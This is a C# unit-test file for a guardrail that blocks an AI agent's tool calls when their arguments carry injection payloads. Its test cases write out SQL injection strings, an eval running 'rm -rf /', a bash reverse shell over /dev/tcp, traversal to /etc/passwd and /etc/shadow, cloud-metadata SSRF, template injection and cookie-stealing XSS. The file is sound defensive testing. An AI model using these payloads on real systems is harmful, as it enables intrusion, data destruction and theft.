using AgentGuard.Core.Abstractions;
using AgentGuard.Core.Rules.ToolCall;
using FluentAssertions;
using Xunit;

namespace AgentGuard.Core.Tests.Rules;

public class ToolCallGuardrailRuleTests
{
    private static GuardrailContext CreateContext(IReadOnlyList<AgentToolCall>? toolCalls = null)
    {
        var ctx = new GuardrailContext { Text = "", Phase = GuardrailPhase.Output };
        if (toolCalls != null)
            ctx.Properties[ToolCallGuardrailRule.ToolCallsKey] = toolCalls;
        return ctx;
    }

    private static AgentToolCall MakeCall(string tool, params (string Key, string Value)[] args) =>
        new()
        {
            ToolName = tool,
            Arguments = args.ToDictionary(a => a.Key, a => a.Value)
        };

    [Fact]
    public async Task ShouldPass_WhenNoToolCallsInContext()
    {
        var rule = new ToolCallGuardrailRule();
        var result = await rule.EvaluateAsync(CreateContext());
        result.IsBlocked.Should().BeFalse();
    }

    [Fact]
    public async Task ShouldPass_WhenToolCallsAreClean()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("search", ("query", "best restaurants in NYC"), ("limit", "10")),
            MakeCall("get_weather", ("city", "Seattle"), ("units", "metric")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeFalse();
    }

    // === SQL Injection ===

    [Fact]
    public async Task ShouldBlock_SqlUnionInjection()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("query_db", ("sql", "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
        result.Reason.Should().Contain("SQL UNION injection");
    }

    [Fact]
    public async Task ShouldBlock_SqlDropTable()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("query_db", ("sql", "DROP TABLE users")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_SqlTautology()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("query_db", ("filter", "' OR 1=1")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_SqlBatchTerminator()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("query_db", ("input", "test; DROP TABLE users")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_SqlExec()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("query_db", ("proc", "EXEC xp_cmdshell 'dir'")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === Code Injection ===

    [Fact]
    public async Task ShouldBlock_PythonEval()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("run_script", ("code", "eval('__import__(\"os\").system(\"rm -rf /\")')")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
        result.Reason.Should().Contain("Python code injection");
    }

    [Fact]
    public async Task ShouldBlock_PythonSubprocess()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("execute", ("command", "subprocess.run(['rm', '-rf', '/'])")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_JavaScriptEval()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("js_exec", ("script", "eval(atob('ZG9jdW1lbnQuY29va2ll'))")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_DotNetCodeInjection()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("execute", ("arg", "Process.Start(\"cmd.exe\", \"/c calc.exe\")")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
        result.Reason.Should().Contain(".NET code injection");
    }

    [Fact]
    public async Task ShouldBlock_PickleDeserialization()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("load_data", ("data", "pickle.loads(base64.b64decode(payload))")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === Path Traversal ===

    [Fact]
    public async Task ShouldBlock_PathTraversal()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("read_file", ("path", "../../etc/passwd")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
        result.Reason.Should().Contain("Directory traversal");
    }

    [Fact]
    public async Task ShouldBlock_EncodedPathTraversal()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("read_file", ("path", "%2e%2e/etc/shadow")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_SensitiveFilePath()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("read_file", ("path", "/etc/passwd")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_NullByteInjection()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("read_file", ("path", "image.png%00.php")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === Command Injection ===

    [Fact]
    public async Task ShouldBlock_CommandChaining()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("system", ("cmd", "echo hello; cat /etc/passwd")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_CommandSubstitution()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("system", ("cmd", "echo $(whoami)")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_BacktickSubstitution()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("system", ("cmd", "echo `id`")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_ReverseShell()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("system", ("cmd", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === SSRF ===

    [Fact]
    public async Task ShouldBlock_LocalhostSsrf()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("fetch_url", ("url", "http://localhost:8080/admin")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
        result.Reason.Should().Contain("Localhost SSRF");
    }

    [Fact]
    public async Task ShouldBlock_InternalNetworkSsrf()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("fetch_url", ("url", "http://192.168.1.1/admin")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_CloudMetadataSsrf()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("fetch_url", ("url", "http://169.254.169.254/latest/meta-data/")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
        result.Reason.Should().Contain("Cloud metadata SSRF");
    }

    [Fact]
    public async Task ShouldBlock_Ipv6LoopbackSsrf()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("fetch_url", ("url", "http://[::1]:8080/admin")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === Template Injection ===

    [Fact]
    public async Task ShouldBlock_Jinja2Injection()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            Categories = ToolCallInjectionCategory.TemplateInjection
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("render", ("template", "{{ config.__class__.__init__.__globals__ }}")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === XSS ===

    [Fact]
    public async Task ShouldBlock_ScriptTagXss()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            Categories = ToolCallInjectionCategory.Xss
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("set_name", ("name", "<script>alert('xss')</script>")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_EventHandlerXss()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            Categories = ToolCallInjectionCategory.Xss
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("set_bio", ("bio", "<img onerror=alert(1) src=x>")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    [Fact]
    public async Task ShouldBlock_JavascriptProtocolXss()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            Categories = ToolCallInjectionCategory.Xss
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("set_link", ("url", "javascript:alert(document.cookie)")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === Allowlists ===

    [Fact]
    public async Task ShouldSkip_AllowedTools()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            AllowedTools = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "code_executor" }
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("code_executor", ("code", "eval('1+1')")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeFalse();
    }

    [Fact]
    public async Task ShouldSkip_AllowedArguments()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            AllowedArguments = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "code" }
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("run", ("code", "eval('1+1')"), ("name", "test")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeFalse();
    }

    [Fact]
    public async Task ShouldSkip_PerToolAllowedArguments()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            PerToolAllowedArguments = new Dictionary<string, ISet<string>>(StringComparer.OrdinalIgnoreCase)
            {
                ["code_runner"] = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "script" }
            }
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("code_runner", ("script", "eval('1+1')")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeFalse();
    }

    [Fact]
    public async Task ShouldStillBlock_NonAllowedArgOnSameTool()
    {
        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions
        {
            PerToolAllowedArguments = new Dictionary<string, ISet<string>>(StringComparer.OrdinalIgnoreCase)
            {
                ["code_runner"] = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "script" }
            }
        });
        var calls = new List<AgentToolCall>
        {
            MakeCall("code_runner", ("script", "eval('1+1')"), ("path", "../../etc/passwd")),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // === Metadata ===

    [Fact]
    public async Task ShouldIncludeViolationMetadata()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("query_db", ("sql", "UNION SELECT password FROM admin")),
        };
        var ctx = CreateContext(calls);
        var result = await rule.EvaluateAsync(ctx);
        result.IsBlocked.Should().BeTrue();
        result.Severity.Should().Be(GuardrailSeverity.Critical);
        result.Metadata!["toolName"].Should().Be("query_db");
        result.Metadata["argumentName"].Should().Be("sql");
        result.Metadata["category"].Should().Be("SqlInjection");
    }

    [Fact]
    public async Task ShouldStoreViolationsInContext()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("query_db", ("sql", "UNION SELECT password FROM admin")),
        };
        var ctx = CreateContext(calls);
        await rule.EvaluateAsync(ctx);
        ctx.Properties.Should().ContainKey(ToolCallGuardrailRule.ViolationsKey);
        var violations = (List<ToolCallViolation>)ctx.Properties[ToolCallGuardrailRule.ViolationsKey];
        violations.Should().HaveCount(1);
    }

    [Fact]
    public void ShouldHaveCorrectMetadata()
    {
        var rule = new ToolCallGuardrailRule();
        rule.Name.Should().Be("tool-call-guardrail");
        rule.Phase.Should().Be(GuardrailPhase.Output);
        rule.Order.Should().Be(45);
    }

    [Fact]
    public async Task ShouldPass_WhenEmptyArguments()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            MakeCall("get_time"),
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeFalse();
    }

    [Fact]
    public async Task ShouldCheckRawContent()
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall>
        {
            new()
            {
                ToolName = "generic",
                Arguments = new Dictionary<string, string>(),
                RawContent = "SELECT * FROM users UNION SELECT password FROM admin"
            }
        };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeTrue();
    }

    // False positive tests
    [Theory]
    [InlineData("search", "query", "SELECT the best restaurants in town")]
    [InlineData("search", "query", "How to DROP a pin on Google Maps")]
    [InlineData("get_weather", "city", "Union City, California")]
    [InlineData("calculator", "expression", "1 + 1 = 2")]
    [InlineData("read_file", "path", "docs/readme.md")]
    [InlineData("fetch_url", "url", "https://example.com/api/data")]
    public async Task ShouldPass_FalsePositives(string tool, string arg, string value)
    {
        var rule = new ToolCallGuardrailRule();
        var calls = new List<AgentToolCall> { MakeCall(tool, (arg, value)) };
        var result = await rule.EvaluateAsync(CreateContext(calls));
        result.IsBlocked.Should().BeFalse(because: $"'{value}' in {tool}.{arg} should not be flagged");
    }
}
